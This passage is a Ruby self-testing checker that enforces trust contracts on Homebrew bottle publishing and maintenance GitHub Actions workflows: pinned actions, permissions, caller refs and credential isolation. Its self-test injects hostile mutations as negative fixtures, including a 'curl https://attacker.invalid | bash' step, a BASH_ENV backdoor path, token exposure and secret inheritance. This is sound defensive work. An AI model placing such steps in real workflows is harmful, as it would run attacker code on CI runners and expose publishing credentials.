    '[ "$CALLER_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    "maintain-bottles.yml@refs/heads/main",
    "rebuild|rollback",
  ].each do |fragment|
    check(validate_run.include?(fragment), "maintenance validation lacks #{fragment}")
  end

  expected_rebuild_permissions = { "contents" => "write", "packages" => "write", "actions" => "read" }
  check(rebuild.keys.sort == %w[if needs permissions uses with] &&
        rebuild["needs"] == ["validate"] &&
        rebuild["if"] == "${{ inputs.mode == 'rebuild' }}" &&
        exact_permissions?(rebuild["permissions"], expected_rebuild_permissions) &&
        rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
        "maintenance rebuild execution contract changed")
  check(rebuild["with"] == {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "main",
    "tap-repository" => "Automattic/kandelo-homebrew",
    "tap-ref" => "main",
    "formulae" => "${{ inputs.formulae }}",
    "arches" => "${{ inputs.arches }}",
    "release-tag" => "${{ inputs.release-tag }}",
    "expected-cache-keys" => "${{ inputs.expected-cache-keys }}",
    "force" => "${{ inputs.force }}",
    "dry-run" => false,
  }, "maintenance rebuild input wiring changed")

  expected_rollback_permissions = { "contents" => "write", "packages" => "read", "actions" => "read" }
  check(rollback.keys.sort == %w[if needs permissions runs-on steps timeout-minutes] &&
        rollback["needs"] == ["validate"] &&
        rollback["if"] == "${{ inputs.mode == 'rollback' }}" &&
        rollback["runs-on"] == "ubuntu-latest" &&
        rollback["timeout-minutes"] == 30 &&
        exact_permissions?(rollback["permissions"], expected_rollback_permissions),
        "maintenance rollback execution contract changed")
  rollback_steps = job_steps(rollback, "maintenance rollback")
  check(contract_digest(rollback_steps) == MAINTENANCE_ROLLBACK_DIGEST,
        "maintenance rollback step contract changed")
  check(values_for_key(workflow, "uses").sort == [
    "./.github/workflows/reusable-homebrew-bottle-publish.yml",
    CHECKOUT_ACTION,
    CHECKOUT_ACTION,
    NIX_ACTION,
  ].sort, "maintenance action set or pin changed")

  checkouts = rollback_steps.select { |step| step["uses"] == CHECKOUT_ACTION }
  check(checkouts.map { |step| { "name" => step["name"], "with" => step["with"] } } == [
    {
      "name" => "Checkout tap",
      "with" => {
        "repository" => "Automattic/kandelo-homebrew",
        "ref" => "main",
        "path" => "tap",
        "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout Kandelo workflow source",
      "with" => {
        "persist-credentials" => false,
        "repository" => "Automattic/kandelo",
        "ref" => "main",
        "path" => "kandelo",
        "submodules" => false,
      },
    },
  ], "maintenance rollback checkout mapping changed")

  record = named_step(rollback_steps, "Record rollback without replacing last-green metadata")
  record_run = record.fetch("run")
  [
    '[[ "$KANDELO_HOMEBREW_FORMULA" =~ ^[a-z0-9][a-z0-9._-]*$ ]]',
    'case "$KANDELO_HOMEBREW_ARCH" in',
    "wasm32|wasm64) ;;",
    '[[ "$KANDELO_HOMEBREW_RELEASE_TAG" =~ ^bottles-abi-v[1-9][0-9]*$ ]]',
  ].each do |fragment|
    check(record_run.include?(fragment), "maintenance rollback lacks #{fragment}")
  end
end

def expect_rejection(label)
  rejected = false
  begin
    yield
  rescue KeyError, RuntimeError
    rejected = true
  end
  check(rejected, "self-test accepted #{label}")
end

def mutate_named_step(workflow, job_name, step_name)
  steps = workflow.fetch("jobs").fetch(job_name).fetch("steps")
  step = steps.find { |candidate| candidate["name"] == step_name }
  raise "self-test could not find #{step_name}" unless step
  step
end

def self_test(publisher, maintenance)
  fixture = YAML.safe_load(<<~YAML, aliases: false)
    on:
      workflow_dispatch: {}
    permissions: write-all
    jobs:
      unsafe:
        steps:
          - uses: actions/cache/restore@v4
          - run: echo "${{ inputs.formulae }}"
          - uses: actions/checkout@v6
  YAML
  check(workflow_events(fixture).key?("workflow_dispatch"), "self-test missed workflow_dispatch")
  expect_rejection("mutable action and cache state") { check_common(fixture, "fixture") }

  publisher_mutations = {
    "top-level environment injection" => lambda { |w| w["env"] = { "BASH_ENV" => "/tmp/backdoor" } },
    "workflow write permission" => lambda { |w| w["permissions"] = "write-all" },
    "direct dispatch" => lambda { |w| workflow_events(w)["workflow_dispatch"] = {} },
    "extra publisher input" => lambda { |w|
      workflow_events(w).fetch("workflow_call").fetch("inputs")["command"] = {
        "type" => "string", "default" => "true",
      }
    },
    "caller feature branch" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "dry-run feature workflow" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("dry-run-bottles.yml@refs/heads/main",
                                           "feature.yml@refs/heads/feature")
    },
    "wrong caller event" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step.fetch("env")["CALLER_EVENT_NAME"] = "push"
    },
    "release tag ABI bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Resolve release and bottle root")
      step["run"] = step.fetch("run").sub('[ "$release_tag" != "$expected_release_tag" ]', "false")
    },
    "uploader dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle")["needs"] = ["plan"]
    },
    "verifier dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle")["needs"] = ["plan", "upload-bottle"]
    },
    "finalizer dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap")["needs"] = ["plan", "verify-bottle"]
    },
    "build authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("build-and-test").fetch("permissions")["packages"] = "write"
    },
    "uploader authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("permissions")["contents"] = "write"
    },
    "verifier authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("permissions")["packages"] = "read"
    },
    "finalizer authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap").fetch("permissions")["packages"] = "write"
    },
    "dry-run bottle upload" => lambda { |w|
      job = w.fetch("jobs").fetch("upload-bottle")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run tap finalization" => lambda { |w|
      job = w.fetch("jobs").fetch("finalize-tap")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "unreviewed Kandelo ref" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout Kandelo workflow source")
      step.fetch("with")["ref"] = "feature"
    },
    "persisted source credentials" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout tap")
      step.fetch("with")["persist-credentials"] = true
    },
    "persisted verifier credentials" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Checkout exact tap source")
      step.fetch("with")["persist-credentials"] = true
    },
    "build token exposure" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Build and test Homebrew bottle without publisher credentials")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "verifier token exposure" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "mutable Homebrew source" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout reviewed Homebrew implementation")
      step.fetch("with")["ref"] = "main"
    },
    "noncanonical Homebrew prefix" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
      step["run"] = step.fetch("run").sub("/home/linuxbrew/.linuxbrew", "/tmp/homebrew")
    },
    "mutable external action" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Download strict build handoff")
      step["uses"] = "actions/download-artifact@main"
    },
    "direct expression in shell" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Warm Kandelo dev shell")
      step["run"] = "echo '${{ inputs.formulae }}'\n#{step.fetch('run')}"
    },
    "handoff retry collision" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Upload strict bottle build handoff")
      step.fetch("with")["name"] = "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}"
    },
    "unvalidated uploader ordering" => lambda { |w|
      steps = w.fetch("jobs").fetch("upload-bottle").fetch("steps")
      validate_index = steps.index { |step| step["name"] == "Validate build data before exposing upload credentials" }
      upload_index = steps.index { |step| step["name"] == "Upload validated bottle in isolated ORAS auth state" }
      steps[validate_index], steps[upload_index] = steps[upload_index], steps[validate_index]
    },
    "uploader validation outcome bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle",
                               "Upload validated bottle in isolated ORAS auth state")
      step.delete("if")
    },
    "direct ORAS upload bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state")
      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
    },
    "credentialed uploader diagnostics" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("steps") << {
        "name" => "Upload diagnostics", "uses" => UPLOAD_ACTION,
        "with" => { "name" => "diagnostics", "path" => "${{ runner.temp }}" },
      }
    },
    "missing anonymous readback" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["run"] = step.fetch("run").sub("homebrew-verify-public-bottle.ts", "true")
    },
    "partial browser runtime fetch" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Fetch the complete ABI browser runtime graph")
      step["run"] = step.fetch("run").sub("scripts/fetch-binaries.sh --fetch-only", "scripts/fetch-node.sh")
    },
    "raw bottle JSON handoff" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Validate build handoff and reconstruct canonical bottle JSON")
      step["run"] = step.fetch("run").sub(/\n\s+--out-bottle-json[^\n]+/, "")
    },
    "raw bottle metadata merge" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Merge only reconstructed bottle metadata into the fresh tap")
      step["run"] = step.fetch("run").sub('--bottle-json "$BOTTLE_JSON"',
                                             '--bottle-json "$RUNNER_TEMP/homebrew-build-handoff/bottle.json"')
    },
    "nonstrict browser smoke" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      step["run"] = step.fetch("run").sub("KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
                                             "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=0")
    },
    "skipped browser smoke accepted" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      step["run"] = step.fetch("run").sub(".stats.skipped == 0", ".stats.skipped >= 0")
    },
    "unvalidated publication handoff" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Validate the complete data-only publication payload")
      step["run"] = step.fetch("run").sub("scripts/homebrew-validate-publish-handoff.sh", "true")
    },
    "credentialed checkout before validation" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Checkout tap publication branch after payload validation")
      step["if"] = "${{ always() }}"
    },
    "failure report through dirty checkout" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = step.fetch("run").sub("tap-report", "tap-publish")
    },
    "raw failure stderr" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = "tail \"$RUNNER_TEMP/homebrew-finalize-error.txt\"\n#{step.fetch('run')}"
    },
    "untrusted executable step" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("steps") << {
        "run" => "curl https://attacker.invalid | bash",
      }
    },
  }
  publisher_mutations.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(publisher)
      mutation.call(mutated)
      check_publisher(mutated)
    end
  end

  maintenance_mutations = {
    "maintenance top-level environment injection" => lambda { |w|
      w["env"] = { "BASH_ENV" => "/tmp/backdoor" }
    },
    "maintenance feature caller" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "maintenance caller workflow bypass" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("maintain-bottles.yml", "feature.yml")
    },
    "maintenance mode short circuit" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = "exit 0\n#{step.fetch('run')}"
    },
    "maintenance rebuild validation bypass" => lambda { |w|
      w.fetch("jobs").fetch("rebuild").delete("needs")
    },
    "maintenance repair mode" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["if"] =
        "${{ inputs.mode == 'rebuild' || inputs.mode == 'repair-only' }}"
    },
    "maintenance rollback write-all" => lambda { |w|
      w.fetch("jobs").fetch("rollback")["permissions"] = { "contents" => "write", "packages" => "write" }
    },
    "maintenance secret inheritance" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["secrets"] = "inherit"
    },
  }
  maintenance_mutations.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(maintenance)
      mutation.call(mutated)
      check_maintenance(mutated)
    end
  end
end

begin
  publisher = load_workflow(PUBLISHER_PATH)
  maintenance = load_workflow(MAINTENANCE_PATH)
  self_test(publisher, maintenance)
  check_publisher(publisher)
  check_maintenance(maintenance)
  puts "check-homebrew-publish-workflow-trust.rb: ok"
rescue KeyError, Psych::Exception, RuntimeError => e
  warn "check-homebrew-publish-workflow-trust.rb: #{e.message}"
  exit 1
end
